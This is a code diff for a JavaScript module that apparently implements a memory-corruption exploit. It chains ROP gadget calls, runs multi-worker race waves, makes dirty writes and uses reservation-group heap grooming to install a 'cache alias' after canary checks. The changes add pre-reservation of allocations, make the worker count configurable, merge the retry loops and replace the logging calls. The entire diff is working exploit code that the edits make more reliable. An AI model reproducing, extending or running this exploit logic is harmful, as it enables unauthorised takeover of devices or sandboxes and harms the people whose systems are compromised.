@@ -1,5 +1,5 @@
 import coreRuntime, {waitMs} from "../runtime.mjs";
-import {emitVerboseStage, isVerboseLogging} from "../log-stage.mjs";
+import {verboseLog, isVerboseLogging} from "../logger.mjs";
 
 const {
   GADGET_MEMSET,
@@ -9,7 +9,6 @@ const {
   executeWave,
   frameArgSlot,
   ipcStorageRead,
-  log,
   openContentStorage,
   openReservationGroup,
   prepPacket,
@@ -21,20 +20,6 @@ const {
   write8,
   writeDirtyData
 } = coreRuntime;
-
-function formatHexValue(value) {
-    return value == null || !Number.isFinite(Number(value))
-        ? "na" : "0x" + Number(value).toString(16);
-}
-
-function formatResultCode(value) {
-    if (value == null) return "na";
-    var raw = Number(value) >>> 0;
-    var canonical = raw === 0xFFFFFFFF ? raw : raw & 0x3FFFFF;
-    return raw === canonical
-        ? "0x" + raw.toString(16)
-        : "0x" + raw.toString(16) + "/0x" + canonical.toString(16);
-}
 
 function formatRenameInputDiagnostics(diagnostics) {
     if (!diagnostics) return "unavailable";
@@ -132,7 +117,8 @@ export async function preparePostCanaryCandidate({
   pktBuf,
   rootSession,
   storageHandle,
-  workerStateSafe
+  workerStateSafe,
+  usePreReservation = false
 }) {
   let candidateHandle = 0;
   let primeHex;
@@ -142,6 +128,7 @@ export async function preparePostCanaryCandidate({
     var aliasControlHex = "";
     primeHex = "";
     var allocCost = null;
+    var preGroup = null;
 
     if (canaryQualified && workerStateSafe) {
         // a) Control read at offset 0 from original storage (full cache block).
@@ -161,8 +148,16 @@ export async function preparePostCanaryCandidate({
             failureReason = (!controlHex || !aliasControlHex)
                 ? "baseline-control-read-failed"
                 : "baseline-offsets-not-distinct";
-            await log("BASELINE: FAIL offsets not distinct");
             canaryQualified = false;
+        }
+    }
+
+    if (usePreReservation && canaryQualified && workerStateSafe) {
+        preGroup = openReservationGroup(rootSession, pktBuf, 59);
+        if (!preGroup.ok) {
+            failureReason = "pre-reservation-failed";
+            canaryQualified = false;
+            preGroup = null;
         }
     }
 
@@ -173,13 +168,7 @@ export async function preparePostCanaryCandidate({
         candidateHandle = openContentStorage(rootSession);
         if (!candidateHandle) {
             failureReason = "candidate-storage-open-failed";
-            await log("BASELINE: FAIL candidateHandle");
         } else {
-            var countersAfter = readAllocationCounters(rootSession, pktBuf);
-            var afterHeap = countersAfter ? countersAfter[5] : null;
-            allocCost = (beforeHeap !== null && afterHeap !== null)
-                ? beforeHeap - afterHeap : null;
-
             var primeBuf = allocPage(0x1000);
             call_rop(GADGET_MEMSET, primeBuf, 0xA5n, 16n);
             var primeRead = ipcStorageRead(candidateHandle, 0, 16, primeBuf);
@@ -188,9 +177,25 @@ export async function preparePostCanaryCandidate({
             if (!primeHex) failureReason = "candidate-prime-read-failed";
             else if (!primeMatchesControl) failureReason = "candidate-prime-mismatch";
 
-            await log("BASELINE: " + (primeMatchesControl ? "OK" : "FAIL") +
-                " alloc=" + (allocCost !== null ? allocCost + "B" : "N/A") +
-                (primeMatchesControl ? "" : " PRIME-MISMATCH"));
+            var countersAfter = readAllocationCounters(rootSession, pktBuf);
+            var afterHeap = countersAfter ? countersAfter[5] : null;
+            allocCost = (beforeHeap !== null && afterHeap !== null)
+                ? beforeHeap - afterHeap : null;
+        }
+
+        if (!candidateHandle) {
+            if (preGroup) closeReservationGroup(preGroup, true, pktBuf);
+            preGroup = null;
+        } else if (preGroup) {
+            if (!Number.isFinite(allocCost) || allocCost < 0) {
+                failureReason = failureReason ||
+                    "pre-reservation-accounting-unavailable";
+                closeReservationGroup(preGroup, true, pktBuf);
+                preGroup = null;
+            } else {
+                preGroup.before[5] -= allocCost;
+                preGroup.held[5] -= allocCost;
+            }
         }
     }
 
@@ -203,8 +208,13 @@ export async function preparePostCanaryCandidate({
   else if (!failureReason && !primeHex)
       failureReason = "candidate-prime-read-failed";
 
+  if (failureReason && preGroup) {
+      closeReservationGroup(preGroup, true, pktBuf);
+      preGroup = null;
+  }
+
   return {ok: true, canaryQualified, candidateHandle, primeHex,
-      aliasControlHex, failureReason};
+      aliasControlHex, preGroup, failureReason};
 }
 
 export async function installCacheAlias({
@@ -213,6 +223,7 @@ export async function installCacheAlias({
   REQ,
   canaryQualified,
   candidateHandle,
+  preGroup = null,
   dirtyFilePath,
   dirtyWriteBuf,
   dirtyWritePkt,
@@ -282,7 +293,6 @@ export async function installCacheAlias({
         if (steps.length !== 7) {
             copyFailureReason = "invalid-copy-plan";
             noteCopyFailure("invalid-copy-plan");
-            await log("ALIAS: FAIL nulWrites=" + steps.length + " (expect 7)");
         } else {
             var allStepsOk = true;
             // Treat the cache entry as modified from the first attempted field
@@ -308,19 +318,17 @@ export async function installCacheAlias({
                 var acceptedResult = null;
                 var stepProgressReported = false;
                 var stepProgressThreshold = Math.ceil(
-                    config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES / 2);
+                    config.MAX_CACHE_WAVES_PER_STEP / 2);
 
-                for (var batch = 0; batch < config.COPY_BATCHES &&
-                    !stepConfirmed && !stoppedByUser && !shouldStop?.(); batch++) {
-                for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS &&
-                    !stoppedByUser && !shouldStop?.(); ca++) {
+                for (var waveAttempt = 0;
+                    waveAttempt < config.MAX_CACHE_WAVES_PER_STEP &&
+                    !stoppedByUser && !shouldStop?.(); waveAttempt++) {
                     stepAttempts++;
 
                     if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                             dirtyWriteBuf, dirtyWritePkt)) {
                         stepHardFailure = "dirty-write-failed";
                         noteCopyFailure(stepHardFailure);
-                        await log("FAIL: step " + stepIdx + " dirty write");
                         allStepsOk = false; break;
                     }
 
@@ -336,13 +344,14 @@ export async function installCacheAlias({
 
                     var renameInputBefore = renamePathBuffers && isVerboseLogging()
                         ? helpers.captureRenameInputState(REQ,
-                            renamePathBuffers) : null;
+                            renamePathBuffers, config.workerRoles) : null;
 
-                    var group = openReservationGroup(rootSession, pktBuf, 59);
+                    var group = preGroup || openReservationGroup(
+                        rootSession, pktBuf, 59);
+                    if (group === preGroup) preGroup = null;
                     if (!group.ok) {
                         stepHardFailure = "reservation-failed";
                         noteCopyFailure(stepHardFailure);
-                        await log("FAIL: step " + stepIdx + " reservation");
                         allStepsOk = false; break;
                     }
 
@@ -359,20 +368,31 @@ export async function installCacheAlias({
                     write32(pinPkt + 0x18n, 1009n);
 
                     var wave = executeWave(waveData.frames, rawScheduling,
-                        workerResources, gates, sendIndices);
-                    wavesStarted += wave.started === 13 ? 1 : 0;
+                        workerResources, gates, sendIndices,
+                        config.workerRoles);
+                    wavesStarted += wave.started === config.WORKER_COUNT
+                        ? 1 : 0;
 
-                    if (wave.created < 13 || wave.started < 13) {
+                    if (wave.created < config.WORKER_COUNT ||
+                        wave.pinned < config.WORKER_COUNT ||
+                        wave.started < config.WORKER_COUNT) {
+
                         var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
-                        closeReservationGroup(group, wave.created < 13 || relCode !== 0, pktBuf);
-                        stepHardFailure = "worker-start-failed";
+                        closeReservationGroup(group,
+                            wave.created < config.WORKER_COUNT ||
+                                relCode !== 0, pktBuf);
+
+                        if (wave.created === config.WORKER_COUNT &&
+                            wave.pinned < config.WORKER_COUNT) {
+                            stepHardFailure = "worker-pinning-failed";
+                        } else {
+                            stepHardFailure = "worker-start-failed";
+                        }
                         noteCopyFailure(stepHardFailure);
-                        await log("FAIL: step " + stepIdx + " workers=" +
-                            wave.created + "/" + wave.started);
                         workerStateSafe = wave.workerStateSafe === true;
                         allStepsOk = false; break;
                     }
-                    if (wave.joined < 13) {
+                    if (wave.joined < config.WORKER_COUNT) {
                         workerStateSafe = false;
                         stepHardFailure = "worker-join-failed";
                         noteCopyFailure(stepHardFailure);
@@ -420,7 +440,7 @@ export async function installCacheAlias({
                             stepGateFailures[gateName] =
                                 (stepGateFailures[gateName] || 0) + 1;
                         }
-                        if (rejectedGates.indexOf("shape-10") >= 0) {
+                        if (rejectedGates.indexOf("shape") >= 0) {
                             for (var sm = 0;
                                 sm < (wResult.shapeMissing || []).length; sm++) {
                                 var missingRole = wResult.shapeMissing[sm];
@@ -434,6 +454,7 @@ export async function installCacheAlias({
                         var pathRole = ["filler0", "filler1", "guard0",
                             "guard1"][pr];
                         var pathCode = pathReplies[pathRole];
+                        if (pathCode == null) continue;
                         var pathRaw = pathCode == null
                             ? null : Number(pathCode) >>> 0;
                         var pathCanonical = pathRaw == null
@@ -482,15 +503,15 @@ export async function installCacheAlias({
                         if (!isVerboseLogging())
                             await reportProgress("Memory alias progress: copy step " +
                                 (stepIdx + 1) + "/" + steps.length +
-                                " complete after " + copyWavesTotal + " waves.");
+                                " complete after " + stepAttempts + " waves.");
                     } else if (reportProgress && !stepProgressReported &&
                         stepAttempts >= stepProgressThreshold) {
                         await reportProgress("Memory alias progress: copy step " +
                             (stepIdx + 1) + "/" + steps.length +
                             " is still searching after " + stepAttempts + "/" +
-                            (config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES) +
+                            config.MAX_CACHE_WAVES_PER_STEP +
                             " waves.");
-                        await emitVerboseStage("Memory alias diagnostics: copy step " +
+                        await verboseLog("Memory alias diagnostics: copy step " +
                             (stepIdx + 1) + "/" + steps.length + " after " +
                             stepAttempts + " waves" + formatCopyWaveDiagnostics(
                                 stepGateFailures, stepShapeMissing,
@@ -517,11 +538,10 @@ export async function installCacheAlias({
                     }
                     if (stepConfirmed || stoppedByUser) break;
                 }
-                }
 
                 if (stoppedByUser && !stepConfirmed) {
                     allStepsOk = false;
-                    await emitVerboseStage("Memory alias stopped during step " +
+                    await verboseLog("Memory alias stopped during step " +
                         (stepIdx + 1) + "/" + steps.length + " after " +
                         stepAttempts + " waves.");
                     break;
@@ -545,7 +565,7 @@ export async function installCacheAlias({
                         attempts: stepAttempts, windowRejects: stepWindowFail,
                         preReleaseRejects: stepPreLow, pathMismatches: stepPathMiss,
                         reason: stepFailureReason});
-                    await emitVerboseStage("Memory alias step " +
+                    await verboseLog("Memory alias step " +
                         (stepIdx + 1) + "/" + steps.length +
                         " rejected after " + stepAttempts + " waves: window=" +
                         stepWindowFail + ", cache=" + stepPreLow +
@@ -555,14 +575,11 @@ export async function installCacheAlias({
                             stepMinLowCacheUsed, stepMaxLowCacheUsed,
                             stepPathReplyFailures) +
                         ".");
-                    await log("  step " + stepIdx + " FAIL att=" + stepAttempts +
-                        " winFail=" + stepWindowFail + " preLow=" + stepPreLow +
-                        " changedPathMiss=" + stepPathMiss);
                     allStepsOk = false; break;
                 }
 
                 copyStepsCompleted++;
-                await emitVerboseStage("Memory alias step " +
+                await verboseLog("Memory alias step " +
                     (stepIdx + 1) + "/" + steps.length + " accepted after " +
                     stepAttempts + " waves" +
                     (acceptedResult?.margin != null
@@ -571,7 +588,6 @@ export async function installCacheAlias({
                         ? " · cache=0x" +
                           Number(acceptedResult.preReleaseUsed).toString(16) : "") +
                     ".");
-                await log("  step " + stepIdx + " OK (att=" + stepAttempts + ")");
                 if (stoppedByUser) {
                     allStepsOk = false;
                     break;
@@ -585,10 +601,12 @@ export async function installCacheAlias({
             aliasInstalled = allStepsOk && !stoppedByUser;
         }
 
-        await log("ALIAS: " + (aliasInstalled ? "OK" : "FAIL") +
-            " " + copyStepsCompleted + "/7 steps (" + copyWavesTotal + " waves)");
     }
 
+  if (preGroup) {
+      closeReservationGroup(preGroup, true, pktBuf);
+      preGroup = null;
+  }
 
   return {ok: true, aliasInstalled, candidateCacheNeedsRetirement,
       copyStepsCompleted, copyWavesTotal, copyFailureReason,
